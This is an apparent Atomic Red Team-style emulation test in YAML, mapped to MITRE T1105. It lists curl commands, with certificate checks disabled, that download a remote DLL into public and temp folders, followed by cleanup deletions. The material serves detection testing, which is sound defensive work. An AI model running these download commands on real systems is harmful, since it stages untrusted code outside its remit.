api_version: "2.0"
name: Curl Download File
description: |
    The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
    Expected output will include whether the file downloaded successfully or not.
args:
    - name: file_download
      type: string
      default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
    - name: curl_path
      type: path
      default: C:\Windows\System32\Curl.exe
uuid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: curl-download-file
      inline: |
        {{.Args.curl_path}} -k {{.Args.file_download}} -o c:\users\public\music\allthethingsx64.dll
        {{.Args.curl_path}} -k {{.Args.file_download}} --output c:\users\public\music\allthethingsx64.dll
        {{.Args.curl_path}} -k {{.Args.file_download}} -o c:\programdata\allthethingsx64.dll
        {{.Args.curl_path}} -k {{.Args.file_download}} -o %Temp%\allthethingsx64.dll
      executor: command_prompt
      cleanup:
        inline: |
            del c:\users\public\music\allthethingsx64.dll >nul 2>&1
            del c:\users\public\music\allthethingsx64.dll >nul 2>&1
            del c:\programdata\allthethingsx64.dll >nul 2>&1
            del %Temp%\allthethingsx64.dll >nul 2>&1
        executor: command_prompt
